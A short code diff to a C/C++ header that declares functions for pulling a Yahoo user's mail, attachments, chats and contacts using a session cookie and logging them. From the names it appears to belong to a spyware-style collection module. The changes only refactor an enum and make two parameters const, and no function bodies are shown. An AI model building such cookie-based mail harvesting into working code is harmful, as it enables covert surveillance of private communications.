@@ -15,7 +15,7 @@
 
 #define YAHOO_ALLOC_SIZE	512
 
-typedef enum
+enum class YahooStatus
 {
 	YAHOO_SUCCESS		= 0x100,
 	YAHOO_ERROR,
@@ -143,7 +143,7 @@ void	YHGetBoundaryValue(LPWSTR strHeader, LPWSTR * strBoundary);
 DWORD	YHGetChat(LPYAHOO_CHAT_FIELDS lpChatFields, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS lpYHParams, LPSTR strCookie);
 DWORD	YHGetConnectionParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
 DWORD	YHGetFoldersName(JSONValue** jValue, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
-DWORD	YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrName);
+DWORD	YHGetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPCSTR pstrName);
 DWORD	YHGetMail(LPSTR* strMail, LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
 DWORD	YHGetMailAttachment(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPYAHOO_MAIL_FIELDS pYHMailFields, LPSTR strCookie, LPYAHOO_MAIL_ATTACHMENT pAttachment);
 DWORD	YHGetMailBody(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie, LPSTR* strMailBody);
@@ -152,7 +152,7 @@ DWORD	YHGetMailsList(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 DWORD	YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams);
 DWORD	YHLogMails(LPSTR strRecvBuffer, LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strCookie);
 BOOL	YHParseForParams(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR strBuffer);
-DWORD	YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPSTR pstrName);
+DWORD	YHSetLastTimeStamp(LPYAHOO_CONNECTION_PARAMS pYHParams, LPCSTR pstrName);
 
 //social handlers
 DWORD	YahooMessageHandler(LPSTR strCookie);
